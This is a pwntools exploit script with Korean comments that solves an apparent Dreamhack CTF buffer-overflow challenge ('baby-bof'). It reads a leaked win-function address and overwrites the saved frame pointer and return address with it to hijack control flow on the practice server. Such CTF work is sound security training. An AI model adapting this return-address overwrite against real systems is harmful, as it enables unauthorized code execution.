from pwn import *

# 1. 접속
# p = process('./baby-bof') # 로컬 테스트용
p = remote('host8.dreamhack.games', 10989)

# 2. Win 함수 주소 릭(Leak) 파싱
# 출력 예시: "... win function (0x401234)!"
p.recvuntil(b"win function (0x")
win_addr = int(p.recvuntil(b")")[:-1], 16)
log.info(f"Win Address: {hex(win_addr)}")

# 3. 이름 입력 (아무거나)
p.recvuntil(b"name: ")
p.sendline(b"Exploit")

# 4. hex value 입력 (덮어쓸 값 = win 주소)
p.recvuntil(b"hex value: ")
p.sendline(hex(win_addr))

# 5. integer count 입력 (덮어쓸 횟수 = 4)
# idx 0, 1(name) -> idx 2(SFP) -> idx 3(RET)
p.recvuntil(b"integer count: ")
p.sendline(b"4")

# 6. 플래그 확인
p.interactive()